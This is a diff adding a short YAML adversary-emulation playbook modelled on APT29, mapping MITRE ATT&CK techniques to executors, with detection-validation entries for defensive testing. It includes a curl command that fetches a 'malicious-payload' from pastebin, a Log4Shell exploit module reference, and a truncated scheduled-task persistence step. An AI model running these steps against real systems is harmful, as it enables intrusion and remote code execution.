@@ -1,0 +1,26 @@
+name: APT29 Emulation Playbook
+id: apt29-emulation-v1
+mitre_attack:
+  - T1190
+  - T1059
+  - T1566
+stages:
+  reconnaissance:
+    - technique: T1595
+      executors:
+        - binary: curl
+          args: '-L http://pastebin.com/raw/malicious-payload'
+  initial_access:
+    - technique: T1190
+      executors:
+        - module: exploit_cve
+          args: 'CVE-2021-44228'
+  persistence:
+    - technique: T1053
+      executors:
+        - command: 'schtasks /create ...'
+detection_validation:
+  sigma_rules:
+    - id: 6b9a83fb-7d9a-4d9e-bd3e-7f5d5e8e5e8e
+  splunk_queries:
+    - 'index=firewall action=blocked src_category="APT29"'
